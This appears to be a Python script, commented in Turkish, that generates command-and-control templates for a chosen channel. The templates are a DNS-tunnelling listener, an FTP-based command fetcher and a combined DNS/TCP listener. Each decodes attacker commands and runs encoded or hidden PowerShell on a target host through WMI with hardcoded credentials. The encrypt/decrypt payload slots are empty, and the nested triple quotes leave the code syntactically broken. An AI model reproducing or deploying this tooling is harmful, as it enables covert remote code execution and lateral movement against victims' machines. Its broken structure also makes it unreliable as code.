print('1:dns 2:ftp 3:https')
x = input("c2 kanalkni seç: ")

a = """

import base64
import socket
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import wmi

key = b'sifre123sifre123sifre123sifre12'
iv = b'\x00' * 16

powershell_encrypt = """  """

powershell_decrypt = """ """

def decrypt_message(enc_msg):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(enc_msg), AES.block_size)
    return decrypted.decode()

def parse_dns_query(data):
    i = 12
    domain_parts = []
    length = data[i]
    while length != 0:
        i += 1
        domain_parts.append(data[i:i+length].decode('utf-8'))
        i += length
        length = data[i]
    domain = '.'.join(domain_parts)
    return domain

def baglan(server_ip, server_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind((server_ip, server_port))
    print(f"DNS tünel sunucusu {server_port} portunda dinleniyor...")
    while True:
        data, addr = s.recvfrom(512)
        try:
            domain = parse_dns_query(data)
            print(f"Gelen DNS sorgusu: {domain}")
            base64_data = domain.split('.')[0]
            enc_msg = base64.b64decode(base64_data)
            mesaj = decrypt_message(enc_msg)
            print(f"Çözülen mesaj: {mesaj}")
            yield mesaj
        except Exception as e:
            print(f"Mesaj çözülemedi: {e}")

def isle(mesaj, hedef_ip, username, password):
    try:
        connection = wmi.WMI(hedef_ip, user=username, password=password)
        process_startup = connection.Win32_ProcessStartup.new()
        process_startup.ShowWindow = 1
        process = connection.Win32_Process

        if mesaj.lower() == "decrypted":
            script = powershell_decrypt
        elif mesaj.lower() == "encrypted":
            script = powershell_encrypt
        else:
            print("Bilinmeyen komut!")
            return

        # Burada Powershell scriptini base64 encode edip UTF-16LE ile encode ediyoruz
        encoded_script = base64.b64encode(script.encode('utf-16le')).decode()

        # Base64 ile encoded command parametresi ile çalıştırıyoruz
        command_line = f'powershell.exe -NoProfile -EncodedCommand {encoded_script}'

        ret = process.Create(CommandLine=command_line, ProcessStartupInformation=process_startup)

        if ret[0] == 0:
            print(f"PowerShell script başarıyla çalıştırıldı. PID: {ret[1]}")
        else:
            print(f"Hata kodu: {ret[0]}")

    except Exception as e:
        print(f"Hata oluştu: {e}")

if __name__ == "__main__":
    for mesaj in baglan('0.0.0.0', 53):
        isle(mesaj, '192.168.1.48', 'kullanici_adi', 'sifre123')

"""
b = """
import base64
import wmi
from ftplib import FTP

def ftp_get_command(host, user, passwd, filename):
    ftp = FTP(host)
    ftp.login(user=user, passwd=passwd)
    lines = []
    ftp.retrlines(f'RETR {filename}', lines.append)
    ftp.quit()
    return '\n'.join(lines)

def powershell_decrypt(encoded_cmd):
    decoded_bytes = base64.b64decode(encoded_cmd)
    return decoded_bytes.decode('utf-16le')  # Unicode PowerShell encoding

def execute_powershell_via_wmi(ps_command):
    c = wmi.WMI()
    process_startup = c.Win32_ProcessStartup.new()
    process_startup.ShowWindow = 0  # Gizli pencerede çalıştır
    startup = process_startup

    # Komutu yine base64 encode ederek powershell'e veriyoruz (UTF-16LE)
    encoded_ps = base64.b64encode(ps_command.encode('utf-16le')).decode()

    command_line = f"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_ps}"

    process_id, result = c.Win32_Process.Create(
        CommandLine=command_line,
        ProcessStartupInformation=startup
    )
    if result == 0:
        print(f"PowerShell process started with PID: {process_id}")
    else:
        print(f"Process creation failed with error code: {result}")

if __name__ == "__main__":
    ftp_host = "ftp.example.com"      # FTP server adresi
    ftp_user = "ftpuser"              # FTP kullanıcı adı
    ftp_pass = "ftppassword"          # FTP şifresi
    ftp_file = "ps_command.b64"       # FTP’deki base64 şifreli PowerShell komutu

    # FTP’den şifreli komutu çek
    encoded_command = ftp_get_command(ftp_host, ftp_user, ftp_pass, ftp_file)

    # Şifreyi çöz (Unicode base64)
    ps_command = powershell_decrypt(encoded_command)

    print("Çözülen PowerShell Komutu:")
    print(ps_command)

    # WMI ile gizli şekilde çalıştır
    execute_powershell_via_wmi(ps_command)



"""
c = """



import base64
import socket
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import wmi
import threading

key = b'sifre123sifre123sifre123sifre12'
iv = b'\x00' * 16

powershell_encrypt = """  """

powershell_decrypt = """ """

def decrypt_message(enc_msg):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(enc_msg), AES.block_size)
    return decrypted.decode()

def parse_dns_query(data):
    i = 12
    domain_parts = []
    length = data[i]
    while length != 0:
        i += 1
        domain_parts.append(data[i:i+length].decode('utf-8'))
        i += length
        length = data[i]
    domain = '.'.join(domain_parts)
    return domain

def baglan_dns(server_ip, server_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind((server_ip, server_port))
    print(f"DNS tünel sunucusu {server_port} portunda dinleniyor (UDP)...")
    while True:
        data, addr = s.recvfrom(512)
        try:
            domain = parse_dns_query(data)
            print(f"Gelen DNS sorgusu: {domain}")
            base64_data = domain.split('.')[0]
            enc_msg = base64.b64decode(base64_data)
            mesaj = decrypt_message(enc_msg)
            print(f"Çözülen mesaj: {mesaj}")
            isle(mesaj, '192.168.1.48', 'kullanici_adi', 'sifre123')
        except Exception as e:
            print(f"DNS Mesaj çözülemedi: {e}")

def baglan_tcp(server_ip, server_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((server_ip, server_port))
    s.listen(5)
    print(f"TCP tünel sunucusu {server_port} portunda dinleniyor (TCP)...")
    while True:
        conn, addr = s.accept()
        print(f"TCP bağlantısı alındı: {addr}")
        data = b''
        try:
            while True:
                part = conn.recv(1024)
                if not part:
                    break
                data += part
            enc_msg = base64.b64decode(data)
            mesaj = decrypt_message(enc_msg)
            print(f"TCP üzerinden çözülen mesaj: {mesaj}")
            isle(mesaj, '192.168.1.48', 'kullanici_adi', 'sifre123')
        except Exception as e:
            print(f"TCP Mesaj çözülemedi: {e}")
        finally:
            conn.close()

def isle(mesaj, hedef_ip, username, password):
    try:
        connection = wmi.WMI(hedef_ip, user=username, password=password)
        process_startup = connection.Win32_ProcessStartup.new()
        process_startup.ShowWindow = 1
        process = connection.Win32_Process

        if mesaj.lower() == "decrypted":
            script = powershell_decrypt
        elif mesaj.lower() == "encrypted":
            script = powershell_encrypt
        else:
            print("Bilinmeyen komut!")
            return

        encoded_script = base64.b64encode(script.encode('utf-16le')).decode()
        command_line = f'powershell.exe -NoProfile -EncodedCommand {encoded_script}'

        ret = process.Create(CommandLine=command_line, ProcessStartupInformation=process_startup)

        if ret[0] == 0:
            print(f"PowerShell script başarıyla çalıştırıldı. PID: {ret[1]}")
        else:
            print(f"Hata kodu: {ret[0]}")

    except Exception as e:
        print(f"Hata oluştu: {e}")

if __name__ == "__main__":
    # DNS ve TCP sunucularını ayrı threadlerde çalıştırıyoruz
    import threading

    dns_thread = threading.Thread(target=baglan_dns, args=('0.0.0.0', 53), daemon=True)
    tcp_thread = threading.Thread(target=baglan_tcp, args=('0.0.0.0', 443), daemon=True)

    dns_thread.start()
    tcp_thread.start()

    print("Sunucular çalışıyor... Ctrl+C ile durdurabilirsiniz.")
    dns_thread.join()
    tcp_thread.join()



"""
if x == '1':
	print(a)
elif x == '2':
	print(b)
elif x == '3':
	print(c)